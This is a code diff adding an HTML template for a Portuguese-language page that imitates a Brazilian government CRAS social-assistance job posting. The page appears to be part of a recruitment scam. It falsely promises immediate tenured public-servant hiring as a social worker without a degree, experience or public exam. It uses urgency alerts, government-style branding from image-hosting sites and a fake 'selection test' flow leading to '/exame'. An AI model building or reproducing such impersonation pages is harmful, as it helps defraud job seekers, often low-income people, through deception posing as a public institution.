@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Informações da Vaga - CRAS</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        /* Rawline Font Family */
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+          font-weight: 400;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+          font-weight: 500;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+          font-weight: 600;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+          font-weight: 700;
+          font-style: normal;
+        }
+
+        body {
+            font-family: 'Rawline', sans-serif;
+            font-size: 16px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        /* Consistent Font Weight for Bold Elements */
+        strong, .font-bold {
+          font-weight: 500 !important;
+        }
+
+        /* Standard Text Sizes and Colors */
+        .text-base {
+          font-size: 16px;
+          color: #555;
+          line-height: 1.5;
+        }
+    </style>
+    
+    <!-- Mobile Protection - Execute immediately -->
+    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
+</head>
+<body>
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- CRAS Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
+        </div>
+    </div>
+
+    <!-- Breadcrumb -->
+    <div class="bg-gray-100 py-3">
+        <div class="container mx-auto px-4">
+            <nav class="text-sm text-gray-600">
+                <a href="/" class="hover:text-blue-600">Início</a>
+                <span class="mx-2">></span>
+                <a href="/vagas" class="hover:text-blue-600">Vagas</a>
+                <span class="mx-2">></span>
+                <a href="/local" class="hover:text-blue-600">Localização</a>
+                <span class="mx-2">></span>
+                <a href="/address" class="hover:text-blue-600">Endereço</a>
+                <span class="mx-2">></span>
+                <span class="text-gray-800">Informações da Vaga</span>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8 max-w-4xl">
+        <!-- Progress Bar -->
+        <div class="mb-8">
+            <div class="flex justify-between items-center mb-2">
+                <span class="text-sm font-medium text-gray-700">Progresso do Cadastro</span>
+                <span class="text-sm font-medium text-gray-700">60%</span>
+            </div>
+            <div class="w-full bg-gray-200 rounded-full h-2">
+                <div class="bg-[#044785] h-2 rounded-full" style="width: 60%"></div>
+            </div>
+        </div>
+
+        <!-- Page Header -->
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-bold text-gray-800 mb-4">
+                Oportunidade Única no CRAS
+            </h1>
+            <p class="text-lg text-gray-600">
+                Conheça os detalhes da vaga de Assistente Social
+            </p>
+        </div>
+
+        <!-- Main Content Card -->
+        <div class="bg-white rounded-lg shadow-lg p-8 mb-6">
+            <!-- Urgency Alert -->
+            <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
+                <div class="flex">
+                    <div class="flex-shrink-0">
+                        <i class="fas fa-exclamation-triangle text-red-500"></i>
+                    </div>
+                    <div class="ml-3">
+                        <h3 class="text-lg font-medium text-red-800">Contratação Urgente</h3>
+                        <p class="text-red-700">
+                            O CRAS está precisando urgentemente de novos Assistentes Sociais para atender à crescente demanda de famílias em situação de vulnerabilidade social.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Job Benefits -->
+            <div class="mb-8">
+                <h2 class="text-2xl font-semibold text-gray-800 mb-4">
+                    <i class="fas fa-star text-yellow-500 mr-2"></i>
+                    Funcionário Público Efetivo
+                </h2>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="bg-blue-50 p-4 rounded-lg">
+                        <h3 class="font-semibold text-blue-800 mb-2">Estabilidade Profissional</h3>
+                        <ul class="text-blue-700 space-y-1">
+                            <li><i class="fas fa-check mr-2"></i>Contrato definitivo como funcionário público</li>
+                            <li><i class="fas fa-check mr-2"></i>Estabilidade no emprego garantida</li>
+                            <li><i class="fas fa-check mr-2"></i>Não pode ser demitido sem justa causa</li>
+                            <li><i class="fas fa-check mr-2"></i>Progressão de carreira</li>
+                        </ul>
+                    </div>
+                    <div class="bg-green-50 p-4 rounded-lg">
+                        <h3 class="font-semibold text-green-800 mb-2">Benefícios Completos</h3>
+                        <ul class="text-green-700 space-y-1">
+                            <li><i class="fas fa-check mr-2"></i>Salário de R$ 4.500 - R$ 5.500</li>
+                            <li><i class="fas fa-check mr-2"></i>13º salário e férias</li>
+                            <li><i class="fas fa-check mr-2"></i>Plano de saúde e odontológico</li>
+                            <li><i class="fas fa-check mr-2"></i>Vale alimentação R$ 1.320/mês</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Requirements -->
+            <div class="mb-8">
+                <h2 class="text-2xl font-semibold text-gray-800 mb-4">
+                    <i class="fas fa-clipboard-list text-[#044785] mr-2"></i>
+                    Requisitos para a Vaga
+                </h2>
+                <div class="bg-gray-50 p-6 rounded-lg">
+                    <div class="grid md:grid-cols-2 gap-6">
+                        <div>
+                            <h3 class="font-semibold text-gray-800 mb-3">✅ O que é EXIGIDO:</h3>
+                            <ul class="text-gray-700 space-y-2">
+                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Boa comunicação com o público</li>
+                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Disposição para ajudar famílias carentes</li>
+                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Empatia e paciência</li>
+                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Responsabilidade social</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800 mb-3">❌ O que NÃO é exigido:</h3>
+                            <ul class="text-gray-700 space-y-2">
+                                <li><i class="fas fa-times text-red-500 mr-2"></i>Curso superior em Serviço Social</li>
+                                <li><i class="fas fa-times text-red-500 mr-2"></i>Experiência prévia na área</li>
+                                <li><i class="fas fa-times text-red-500 mr-2"></i>Formação específica</li>
+                                <li><i class="fas fa-times text-red-500 mr-2"></i>Certificações profissionais</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="mt-4 p-4 bg-yellow-50 border-l-4 border-yellow-400">
+                        <p class="text-yellow-800">
+                            <strong>Importante:</strong> O CRAS oferecerá toda a capacitação necessária para que você possa exercer a função com excelência.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Assessment Process -->
+            <div class="mb-8">
+                <h2 class="text-2xl font-semibold text-gray-800 mb-4">
+                    <i class="fas fa-tasks text-[#044785] mr-2"></i>
+                    Processo de Seleção
+                </h2>
+                <div class="bg-blue-50 p-6 rounded-lg">
+                    <p class="text-blue-800 mb-4">
+                        Para garantir que você está preparado para atender as famílias com qualidade, realizaremos <strong>2 testes online</strong> simples:
+                    </p>
+                    <div class="grid md:grid-cols-2 gap-4 mb-4">
+                        <div class="bg-white p-4 rounded-lg border border-blue-200">
+                            <h4 class="font-semibold text-blue-800 mb-2">
+                                <i class="fas fa-heart text-red-500 mr-2"></i>
+                                Teste 1: Inteligência Emocional
+                            </h4>
+                            <p class="text-blue-700 text-sm">
+                                Avalia sua capacidade de lidar com situações emocionais e relacionar-se com pessoas em vulnerabilidade.
+                            </p>
+                        </div>
+                        <div class="bg-white p-4 rounded-lg border border-blue-200">
+                            <h4 class="font-semibold text-blue-800 mb-2">
+                                <i class="fas fa-brain text-purple-500 mr-2"></i>
+                                Teste 2: Avaliação Psicotécnica
+                            </h4>
+                            <p class="text-blue-700 text-sm">
+                                Verifica suas habilidades de raciocínio e aptidão para o trabalho social.
+                            </p>
+                        </div>
+                    </div>
+                    <div class="bg-green-100 p-4 rounded-lg">
+                        <p class="text-green-800">
+                            <i class="fas fa-trophy text-yellow-500 mr-2"></i>
+                            <strong>Resultado:</strong> Obtendo uma boa nota nos testes, o CRAS fará sua contratação imediata como funcionário público efetivo!
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Action Button -->
+            <div class="text-center">
+                <button onclick="startAssessment()" class="bg-[#044785] hover:bg-blue-700 text-white font-bold py-4 px-8 rounded-lg text-lg transition-colors duration-300 shadow-lg">
+                    <i class="fas fa-play-circle mr-2"></i>
+                    Iniciar Testes de Seleção
+                </button>
+                <p class="text-gray-600 mt-3 text-sm">
+                    Os testes levam aproximadamente 15 minutos para serem concluídos
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#044785] text-white py-8 md:py-12">
+        <div class="container mx-auto px-4 md:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">O que é o CRAS</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Proteção Social Básica</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Atendimento às Famílias</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Grupos de Convivência</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Benefícios Sociais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Assistência Social</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Cadastro Único</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Bolsa Família</a></li>
+                        <li><a href="#" class="hover:text-gray-200">BPC</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Auxílio Brasil</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Programas Sociais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Vagas</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Portal do Servidor</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <hr class="border-blue-400 mb-6">
+            
+            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
+                <div class="mb-4 md:mb-0">
+                    <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
+                </div>
+                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
+                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
+                </div>
+                <div class="flex space-x-4 mt-4 md:mt-0">
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function startAssessment() {
+            // Show loading state
+            const button = event.target;
+            const originalText = button.innerHTML;
+            button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Preparando testes...';
+            button.disabled = true;
+            
+            // Simulate preparation time
+            setTimeout(() => {
+                window.location.href = '/exame';
+            }, 1500);
+        }
+
+        // Save form progress
+        document.addEventListener('DOMContentLoaded', function() {
+            // Mark this step as completed
+            localStorage.setItem('infoPageCompleted', 'true');
+            console.log('Info page accessed - marking as completed');
+        });
+    </script>
+</body>
+</html>
